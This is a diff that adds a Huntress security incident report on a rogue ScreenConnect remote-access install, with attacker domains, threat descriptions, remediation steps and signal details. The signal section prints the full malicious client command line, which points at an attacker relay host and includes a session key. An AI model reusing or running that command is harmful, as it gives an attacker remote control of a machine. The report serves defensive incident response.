@@ -1,0 +1,47 @@
+Investigative Summary
+---------------------
+At 2025-08-19 18:05:08 UTC, Huntress observed user "User1" executing a malicious process ScreenConnect.ClientService.exe. Huntress observed this user downloaded remittss.exe on the endpoint ATN85406. This interaction resulted in multiple remote management tool installations that connect to the following domains:
+suyafisi[.]top
+https[:]//funksstarter[.]top
+
+It is recommended to audit all of the remote management tools installed on the endpoint in addition to following the remediation section.
+
+Threat Descriptions:
+-------------------
+Rogue ScreenConnect: Huntress has been tracking a number of malicious threat actors convincing users via email into running malicious ScreenConnect (ConnectWise Control) installers that give the threat actor remote access to the host. 
+
+Rogue Simplehelp: Huntress has been tracking a number of malicious threat actors convincing users via email into running malicious Simplehelp installers that give the threat actor remote access to the host.
+
+Persistence : Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.
+
+Remediations:
+-------------
+Assisted Remediations provided by the Huntress SOC to remediate the incident. These can be executed automatically in the Huntress Platform:
+- Kill Process - path: C:\Program Files (x86)\ScreenConnect Client (b605ab538b34a989)\ScreenConnect.ClientService.exe + pid: 22624
+- Delete Service - name: ScreenConnect Client (24a22b9fc261d141)
+- Delete Service - name: AnyDesk
+- Delete Service - name: Remote Access Service
+- Delete Service - name: ScreenConnect Client (2f193a6e5e15c3cc)
+- Delete Service - name: ScreenConnect Client (b605ab538b34a989)
+- Delete Registry Key - key: HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (b605ab538b34a989)
+- Delete Registry Key - key: HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (2f193a6e5e15c3cc)
+- Delete Registry Key - key: HKLM\SYSTEM\CurrentControlSet\Services\Remote Access Service
+- Delete Registry Key - key: HKLM\SYSTEM\CurrentControlSet\Services\AnyDesk
+- + 15 more
+
+Manual Remediations provided by the Huntress SOC are highly recommended remediation actions to be conducted by your team before resolving the incident in the Huntress Platform:
+- Consider enrolling the user in security awareness training to prevent recurrence.
+- Audit affected directories/files for additional suspicious files and remove those found. 
+
+All remediations provided can be found in the Huntress Platform: Incident Report: https://tabinc.huntress.io/org/432146/infection_reports/1654390#remediations-tab
+
+Lead Signal Information
+-----------------------
+Signal Name: Known Malicious Screen Connect
+Detected At: 2025-08-19 18:04:37 UTC
+Start Time: 2025-08-19 17:56:35 UTC
+Command: "C:\Program Files (x86)\ScreenConnect Client (b605ab538b34a989)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=suyafisi.top&p=8041&s=8c9487cf-248f-4e04-95e8-d960b250c9b9&k=BgIAAACkAABSU0ExAAgAAAEAAQC1omrAkeBpdeBmTXs7JQsjj7OUBgDJpxjLmGf%2fqtGvcP%2bfeHZDIG61FBosUZEKu1rnQqhxqgEmNkaM8Naf3lsv65cYE%2bCbXaT6VjvlBFsYxOHzoolJdWDzDTt8y2%2fGpvs4OIQX5Ng%2bEo5lljH88pmDJKgTehMYy6zqrYgAmYVgx%2fYX7Z9586WlGR6sRLINpshalrTkbvuZEUaMYUZoqHtazOROVlNbHrt0uJP6Yz6dIU4y5c5%2fHCiGEoNJXAO9TMe5VlEoSJ4wOmAasQw6exvERwQr8j4CeQJv3TsPhPu225S5k4JJM%2fMqAEocwP9MgHY3It2sT4qjbZw%2b%2fflqlRix"
+Executable: C:\Program Files (x86)\ScreenConnect Client (b605ab538b34a989)\ScreenConnect.ClientService.exe
+Process ID: 25428428-7d1d-11f0-ba07-4cb04ac23935
+Parent Process: C:\Windows\System32\services.exe
+User: SYSTEM
